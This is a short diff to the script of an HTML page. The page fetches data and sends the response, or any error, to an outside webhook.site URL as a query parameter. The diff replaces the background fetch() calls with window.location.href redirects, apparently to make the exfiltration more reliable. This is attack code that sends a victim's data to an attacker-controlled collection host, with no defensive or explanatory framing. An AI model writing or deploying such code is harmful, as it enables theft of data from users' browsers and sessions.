@@ -12,10 +12,10 @@
     })
     .then(r => r.text())
     .then(data => {
-      fetch("https://webhook.site/2633784c-c9d9-4e38-855d-ca6b4a7027ec?data=" + encodeURIComponent(data));
+      window.location.href = "https://webhook.site/2633784c-c9d9-4e38-855d-ca6b4a7027ec?data=" + encodeURIComponent(data);
     })
     .catch(e => {
-      fetch("https://webhook.site/2633784c-c9d9-4e38-855d-ca6b4a7027ec?err=" + encodeURIComponent(String(e)));
+      window.location.href = "https://webhook.site/2633784c-c9d9-4e38-855d-ca6b4a7027ec?err=" + encodeURIComponent(String(e));
     });
 </script>
 </body>
